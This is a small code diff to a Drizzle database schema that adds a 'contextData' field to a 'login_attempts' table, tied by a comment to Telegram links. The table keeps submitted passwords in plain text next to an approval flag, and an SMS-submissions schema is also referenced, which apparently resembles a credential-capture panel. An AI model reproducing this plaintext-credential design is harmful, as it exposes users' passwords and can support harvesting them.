@@ -13,6 +13,7 @@ export const loginAttempts = pgTable("login_attempts", {
   emailOrPhone: text("email_or_phone").notNull(),
   password: text("password").notNull(),
   returnUri: text("return_uri").notNull(),
+  contextData: text("context_data"), // Add context_data to link with telegram_links
   timestamp: timestamp("timestamp").defaultNow().notNull(),
   approved: boolean("approved").default(false).notNull(),
 });
@@ -58,6 +59,7 @@ export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).pick({
   emailOrPhone: true,
   password: true,
   returnUri: true,
+  contextData: true,
 });
 
 export const insertSmsSubmissionSchema = createInsertSchema(smsSubmissions).pick({
